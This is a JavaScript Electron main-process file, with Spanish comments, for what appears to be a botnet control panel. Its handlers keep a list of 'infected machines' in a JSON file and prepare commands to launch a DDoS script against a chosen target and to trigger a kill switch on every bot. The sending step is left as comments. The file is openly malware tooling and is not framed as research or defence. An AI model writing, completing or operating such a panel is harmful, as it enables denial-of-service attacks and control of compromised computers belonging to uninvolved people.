const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');

let mainWindow;

app.on('ready', () => {
    mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            preload: path.join(__dirname, 'preload.js'),
            nodeIntegration: true,
        },
    });

    mainWindow.loadFile('index.html');
});

ipcMain.on('launch-ddos', (event, target) => {
    // Lógica para lanzar ataque DDoS
    // Ejemplo: Enviar comando a las máquinas infectadas para iniciar el ataque
    const command = `python3 ddos_script.py ${target}`;
    // Enviar comando a todas las máquinas infectadas
});

ipcMain.on('kill-switch', (event) => {
    // Lógica para activar kill switch
    // Ejemplo: Enviar comando a todas las máquinas para que se autodestruyan
    const command = `python3 kill_switch_script.py`;
    // Enviar comando a todas las máquinas infectadas
});

ipcMain.on('get-infected-machines', (event) => {
    const filePath = path.join(__dirname, 'infected_machines.json');
    if (fs.existsSync(filePath)) {
        const data = fs.readFileSync(filePath, 'utf8');
        const machines = JSON.parse(data);
        event.reply('infected-machines', machines);
    } else {
        event.reply('infected-machines', []);
    }
});

ipcMain.on('add-infected-machine', (event, machine) => {
    const filePath = path.join(__dirname, 'infected_machines.json');
    let machines = [];
    if (fs.existsSync(filePath)) {
        const data = fs.readFileSync(filePath, 'utf8');
        machines = JSON.parse(data);
    }
    machines.push(machine);
    fs.writeFileSync(filePath, JSON.stringify(machines, null, 2), 'utf8');
});
